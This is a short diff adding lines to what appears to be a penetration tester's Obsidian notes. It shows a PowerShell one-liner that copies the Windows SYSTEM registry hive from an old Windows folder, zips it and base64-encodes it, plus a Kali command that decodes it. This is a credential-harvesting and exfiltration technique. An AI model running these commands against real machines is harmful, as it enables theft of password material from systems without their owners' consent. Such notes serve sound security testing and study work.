@@ -70,3 +70,19 @@ dv.paragraph("```bash\n" + command + "\n```");
 ✔ File now lands on Kali Desktop  
 ✔ No hosting on Windows  
 ✔ No firewall problems
+
+
+---
+
+
+```
+Copy-Item C:\windows.old\Windows\System32\SYSTEM C:\Temp\SYSTEM Compress-Archive -Path C:\Temp\SYSTEM -DestinationPath C:\Temp\sys.zip [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\sys.zip"))
+```
+
+Copy all base64 code in your kali linux in base64_file.txt then run:
+
+```
+base64 -d > sys.zip < base64_file.txt
+```
+
+---
